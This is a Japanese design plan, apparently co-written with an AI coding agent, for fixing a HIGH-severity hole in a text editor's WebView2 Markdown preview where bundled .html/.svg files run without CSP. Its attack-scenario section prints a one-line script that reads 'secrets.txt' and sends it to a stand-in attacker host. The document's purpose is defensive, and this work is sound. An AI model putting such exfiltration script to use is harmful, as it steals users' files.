# プレビュー intra ナビゲーション制限 設計書 — 2026-07-22 (MD-H-1)

> **For Claude:** REQUIRED SUB-SKILL: 実装は superpowers:executing-plans / superpowers:subagent-driven-development で task 単位に進める。

**Goal:** Markdown プレビューの WebView2 が、仮想ホスト `https://yedit.preview/*` への **トップレベルナビゲーション** を一切許可しないようにし、攻撃者が同梱した `.html` / `.svg` が CSP なしで実行される経路 (MD-H-1) を根本から塞ぐ。

**Architecture:** `PreviewNavigationPolicy.Classify` の分類を 1 箇所変更する最小差分。`https` + host == preview の分岐を `AllowIntra` → `Block` に変える。挙動不変の担保 (about:blank / data: bootstrap / CSS・画像サブリソース / 外部リンクの既定ブラウザ起動) はすべて別経路のため影響なし。テストは既存 2 件の期待値更新 + 新規回帰 2 件。

**Tech Stack:** C# / .NET 9 / WinForms / WebView2 / Markdig / xUnit

---

## 背景 — MD-H-1 (新規 HIGH)

2026-07-22 の追加監査 (4 攻撃面の HIGH/MEDIUM/LOW 対応完了後) で検出した新規 HIGH。既存の audit doc (`2026-07-19-security-hardening-medium-low.md`) には未記載の経路。

### 脆弱性の要旨

Markdown プレビューの多層防御 (`DisableHtml()` + `SafeLinkExtension` + `default-src 'none'; connect-src 'none'` の CSP) は **レンダリングされたプレビュー文書本体のみ** を守る。仮想ホスト `https://yedit.preview/` は `SetVirtualHostNameToFolderMapping` で **開いた `.md` と同じフォルダ (攻撃者制御)** にマッピングされており、そこに置かれた任意の `.html` / `.svg` へ in-frame ナビゲートできる。この遷移先文書には:

- `PreviewNavigationPolicy.Classify` が `AllowIntra` を返す → **ナビゲーションが cancel されない** (`PreviewNavigationPolicy.cs:76-78`, 消費側 `MarkdownPreviewForm.cs:178-181`)
- CSP ヘッダインジェクタは `/_yedit/styles.css` の **完全一致 URL** にしか発火しない → Document ナビゲーションには **CSP が一切付与されない** (`PreviewCspHeaderInjector.cs:84-89`)
- 攻撃者の `.html` に `<meta>` CSP は当然無い

結果、遷移先は `https://yedit.preview` オリジンで **CSP なし・スクリプト実行可・connect-src 無制限** で読み込まれ、`fetch` によるフォルダ配下ファイルの読み取り + 外部への無制限送出が成立する。プレビューが構築した「スクリプト実行させない・外部通信させない」保証が、スキームなし相対リンク 1 つで完全に迂回される。

### 攻撃シナリオ

攻撃者がドキュメント一式 (zip/フォルダ) を配布:

- `README.md`: `詳細は [セットアップ手順](setup.html) を参照`
- `setup.html` (同一フォルダ): `<script>fetch('secrets.txt').then(r=>r.text()).then(t=>fetch('https://evil.example/c?d='+encodeURIComponent(t)))</script>`

被害者が展開 → `README.md` を yEdit で開く → プレビュー → リンククリック。相対リンク `setup.html` は `SafeLinkExtension.IsAllowedLinkUrl` を通過し (`SafeLinkExtension.cs:63-66`、スキームなしは許可)、`<base href="https://yedit.preview/">` で `https://yedit.preview/setup.html` に解決 → `AllowIntra` → in-frame 遷移 → CSP なしで JS 実行。`[詳細](evil.svg)` (`<script>` 埋め込み SVG) の変種も同様。

### 影響の範囲 (正直な限界)

- 読み取れるのは仮想ホストにマッピングされた `.md` フォルダのサブツリーのみ (WebView2 が `../` エスケープを防ぐ)。ディスク全体ではない。
- ユーザーのクリックが必要。
- ホストブリッジ (`WebMessageReceived`) は文字列 `"close"` しか受け付けないため RCE には至らない。

ただし「任意 JS 実行 + 外部への無制限通信 + 同一フォルダ内ファイル窃取 + プレビュー chrome を保ったままのフィッシング」は、まさにこのプレビューが防ぐと明言していたものであり、Severity **HIGH**。

## 根本原因

`PreviewNavigationPolicy` が **`yedit.preview` オリジン全体を無条件に信頼** (`AllowIntra`) している。プレビュー本体は `NavigateToString` (data: URI) で配信され、正規経路で **トップレベルナビゲーションが `yedit.preview/*` を指すことは設計上一度もない** (CSS/画像は `WebResourceRequested` のサブリソース経路であり `NavigationStarting` を通らない)。よって「`yedit.preview` へのトップレベルナビゲーション = 攻撃者文書へのナビゲーション」であり、信頼する理由がない。

## 設計判断 — Option 1 (ナビゲーションポリシー最小修正) 採用

### 採用案

`https` + host == preview を `AllowIntra` → `Block` に変更。攻撃者文書は **そもそもロードされない**。ロードされない以上、後段の CSP で守る対象自体が消える。フィッシング chrome 偽装も同時に塞げる。

### 不採用案 — Option 2 (CSP を全レスポンスに配信)

`AddWebResourceRequestedFilter("https://yedit.preview/*", All)` へ広げ全レスポンスに CSP ヘッダを注入する案。不採用理由:

1. **単独では弱い**: CSP を付けても攻撃者文書は「プレビュー: README.md - yEdit」のタイトルのままモーダル内に表示され続ける (chrome 偽装が残る)。
2. **実装が重い**: 現状のインジェクタは CSS のみ返す。任意 content-type (画像/SVG/HTML) を自前で再配信して CSP を載せる必要があり、設計が意図的に仮想ホストマッピングへ委ねていたファイル読み + MIME 判定を呼び戻すことになる。yEdit の「最小差分・正常運用不変」方針に反する。

→ Option 2 は Option 1 を入れた上での任意の belt-and-suspenders 止まり。今回スコープ外。

## 挙動不変性 (回帰しないことの担保)

Option 1 で影響を受けるのは **`yedit.preview` へのトップレベルナビゲーションのみ**。以下はすべて別経路で無影響:

| 正常機能 | 経路 | 影響 |
|---|---|---|
| プレビュー本体の描画 | `NavigateToString` (data: URI, bootstrap one-shot) | なし (Classify を通らない) |
| CSS 読み込み `/_yedit/styles.css` | `WebResourceRequested` (Stylesheet サブリソース) | なし (`NavigationStarting` を通らない) |
| 画像の相対リソース解決 | サブリソース (img) | なし |
| about:blank 初期 origin | `Classify` 先頭で個別 `AllowIntra` 維持 | なし |
| 外部 http/https リンク | `LaunchExternal` → 既定ブラウザ | なし (preview host 以外は不変) |
| mailto | `LaunchExternal` | なし |
| file/data/javascript/vbscript | `Block` | なし (元から Block) |

**唯一の挙動変化**: `.md` 内の相対リンクが `yedit.preview` のファイル/パスに解決するクリックは、遷移せず cancel される (= 何も起きない)。これはまさに塞ぎたい攻撃経路そのもの。相対リンクで別 `.md` を開いても現状は raw テキストが表示されるだけで rendered preview にはならないため、失われる有用な正規挙動は無い。

### ページ内アンカー (`#section`) の扱い

パイプラインは `UseAdvancedExtensions()` (AutoIdentifiers 有効) のため、作者は `[目次](#section)` を書ける。ただし `<base href="https://yedit.preview/">` + `NavigateToString` (現在 URL は data: URI) の構成では、`#section` は同一文書スクロールにならず `https://yedit.preview/#section` へのクロス文書遷移になる可能性が高く、その場合 **現状でも期待どおりスクロールしていない** (仮想ホスト直下へ遷移)。よって Block 化しても「動いていた機能を壊す」ことにはならない見込み。同一文書スクロールが効いているケース (= `NavigationStarting` が発火しない) ならポリシーに届かず Block の影響を受けない。どちらに転んでも安全側。→ **L5 で目視確認のみ** (下記)。恒久的なページ内アンカー対応が必要になった場合は client-side の別機能として別途扱う (本セキュリティ修正のスコープ外)。

## 変更詳細

### src 修正 (1 ファイル)

**`src/yEdit.App/PreviewNavigationPolicy.cs`**

`Classify` の switch (現状 76-84 行):

```csharp
string scheme = parsed.Scheme.ToLowerInvariant();
return scheme switch
{
    // MD-H-1: preview 仮想ホストへのトップレベルナビゲーションは Block。
    // プレビュー本体は NavigateToString(data:) で配信され、CSS/画像は
    // WebResourceRequested のサブリソース経路 = 正規経路で yedit.preview への
    // トップレベルナビゲーションは一度も発生しない。従って yedit.preview への
    // ナビゲーション = 同梱ファイル (attacker 制御) への遷移であり、これを許すと
    // CSP 未適用の .html/.svg が同一オリジンでスクリプト実行できてしまう。
    // (LaunchExternal に落とさないこと: yedit.preview は実ホストではないため
    //  既定ブラウザ起動は無意味。Block で cancel のみが正しい。)
    "https"
        when string.Equals(parsed.Host, PreviewHost, StringComparison.OrdinalIgnoreCase) =>
        Classification.Block,
    "http" or "https" => Classification.LaunchExternal,
    "mailto" => Classification.LaunchExternal,
    _ => Classification.Block,
};
```

`Classification` enum の doc コメント (29-30 行 `AllowIntra`) を更新: 「preview 内で許可 (about:blank のみ)。MD-H-1 以降、`https://yedit.preview/*` は Block。」

クラス XML doc の「攻撃面」列挙 (13-21 行) に MD-H-1 の 1 項目を追記。

### テスト修正 (`tests/yEdit.App.Tests/PreviewNavigationPolicyTests.cs`)

**期待値更新 (既存 2 件)** — 現状 `AllowIntra` を固定している以下を `Block` へ:

- `Classify_HttpsPreviewHost_ReturnsAllowIntra` → `Classify_HttpsPreviewHost_ReturnsBlock` (`https://yedit.preview/foo/bar.md` → `Block`)
- `Classify_HttpsPreviewHost_UpperCase_ReturnsAllowIntra` → `..._ReturnsBlock` (`HTTPS://YEDIT.PREVIEW/x` → `Block`)

**新規回帰 (2 件)** — MD-H-1 の攻撃入力そのものを機械固定:

- `Classify_HttpsPreviewHost_HtmlFile_ReturnsBlock`: `https://yedit.preview/setup.html` → `Block`
- `Classify_HttpsPreviewHost_SvgFile_ReturnsBlock`: `https://yedit.preview/evil.svg` → `Block`

**維持 (変更しない)** — about:blank / 外部 host / mailto / file / data / bootstrap 検出系はすべて現状のまま緑であること。特に `Classify_AboutBlank_ReturnsAllowIntra` が `AllowIntra` のまま残ることを確認 (enum 値が死なない担保)。

ファイル冒頭の分類ルール doc コメント (7-15 行) の `https://yedit.preview/*` → `AllowIntra` 記述を `Block (MD-H-1)` に更新。

## L5 手動検証 (実プレビュー・必須)

WebView2 runtime 依存のため unit test 不可。PR description に以下を記載:

1. **正常系**: 通常の `.md` を開きプレビュー表示 → 見た目 (CSS/フォント/レイアウト)・画像表示が従来どおりであること。
2. **外部リンク**: `[ext](https://example.com)` クリック → 既定ブラウザで開くこと (LaunchExternal 不変)。
3. **攻撃系 (塞がったことの確認)**: `README.md` + `setup.html` を同一フォルダに置き、`[guide](setup.html)` をクリック → **何も起きない (遷移しない)** こと。`setup.html` の `<script>` が実行されないこと。
4. **ページ内アンカー**: `[目次](#h1)` + `# h1` 見出しのある `.md` でクリック → 修正前後で挙動が変わらないこと (元々スクロールしないなら不変、が期待)。

## タスク分解 (TDD)

### Task 1: 攻撃入力の回帰テストを先に追加 (失敗確認)

**Files:** Modify `tests/yEdit.App.Tests/PreviewNavigationPolicyTests.cs`

- Step 1: 新規 2 件 (`..._HtmlFile_ReturnsBlock` / `..._SvgFile_ReturnsBlock`) を追加。期待値は `Block`。
- Step 2: 実行して **失敗** を確認 (現状は `AllowIntra` が返るため)。
  - Run: `dotnet test tests/yEdit.App.Tests --filter "FullyQualifiedName~PreviewNavigationPolicyTests" -v minimal`
  - Expected: 新規 2 件が FAIL (`Expected Block, Actual AllowIntra`)。

### Task 2: Classify を修正 (最小実装)

**Files:** Modify `src/yEdit.App/PreviewNavigationPolicy.cs`

- Step 1: 上記「変更詳細」の switch アームを `AllowIntra` → `Block` に変更 + コメント追記。
- Step 2: 新規 2 件が PASS することを確認。
  - Run: `dotnet test tests/yEdit.App.Tests --filter "FullyQualifiedName~PreviewNavigationPolicyTests" -v minimal`
  - Expected: 新規 2 件 PASS。既存 `..._ReturnsAllowIntra` 2 件が今度は FAIL (期待値が旧挙動のため)。

### Task 3: 既存テストの期待値を新挙動へ更新

**Files:** Modify `tests/yEdit.App.Tests/PreviewNavigationPolicyTests.cs`

- Step 1: `Classify_HttpsPreviewHost_ReturnsAllowIntra` / `..._UpperCase_...` を `Block` 期待へ改名 + 更新。冒頭 doc コメントの分類ルールも更新。
- Step 2: クラス全体が緑であることを確認 (about:blank が `AllowIntra` のまま残ることも含む)。
  - Run: `dotnet test tests/yEdit.App.Tests --filter "FullyQualifiedName~PreviewNavigationPolicyTests" -v minimal`
  - Expected: 全 PASS。

### Task 4: enum / クラス doc コメント更新

**Files:** Modify `src/yEdit.App/PreviewNavigationPolicy.cs`

- Step 1: `Classification.AllowIntra` の doc と クラス XML doc の攻撃面列挙に MD-H-1 を反映。
- Step 2: ビルド 0 警告確認。
  - Run: `dotnet build yEdit.sln -c Release`
  - Expected: 0 warning。

### Task 5: ローカルゲート + フォーマット

- Step 1: `dotnet csharpier check .` (フォーマット) → 差分あれば `dotnet csharpier format .`。
- Step 2: `pwsh tools/pre-merge-check.ps1` (**main マージ前必須ゲート**) を実行し全緑を確認。
- Step 3: コミット。

```
feat(security): MD-H-1 preview 仮想ホストへの top-level nav を Block

Markdown プレビューの WebView2 が https://yedit.preview/* への
トップレベルナビゲーションを AllowIntra で許可していたため、攻撃者が
.md と同一フォルダに同梱した .html/.svg へ遷移でき、CSP 未適用・同一
オリジンで任意 JS 実行 + フォルダ内ファイル窃取 + 外部送出が可能だった。
Classify を Block に変更し、遷移そのものを cancel する。

正規経路 (NavigateToString bootstrap / CSS・画像サブリソース / about:blank /
外部リンクの既定ブラウザ起動) は別経路のため挙動不変。

Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>
```

## レビュー / マージ

- マージ前に別エージェントへコードレビュー依頼 ([[review-by-separate-agent]] 慣例)。
- `code-reviewer` subagent → 指摘対応 → main へ no-ff マージ ([[phase-work-git-flow]])。
- リリースは既存の security リリースサイクルに相乗り (GitHub Releases zip + SHA256)。深刻度 HIGH のため SECURITY.md 記載の方針どおり修正リリースと同時に GitHub Security Advisory 公開を検討。

## 参照

- `src/yEdit.App/PreviewNavigationPolicy.cs` — 唯一の src 修正対象
- `src/yEdit.App/MarkdownPreviewForm.cs:178-181` — Classify の消費側
- `src/yEdit.App/PreviewCspHeaderInjector.cs:84-89` — CSP filter が styles.css 完全一致のみ (今回は変更しない)
- `src/yEdit.Core/Text/SafeLinkExtension.cs:63-66` — 相対リンク許可 (今回は変更しない)
- `docs/plans/2026-07-19-security-hardening-medium-low.md` — MD-M-* 系の既存監査 (MD-H-1 は未記載の新規)
- `docs/plans/2026-07-20-security-hardening-v011-design.md` — 直近のセキュリティ設計 (WebView2 複合防御の前提)
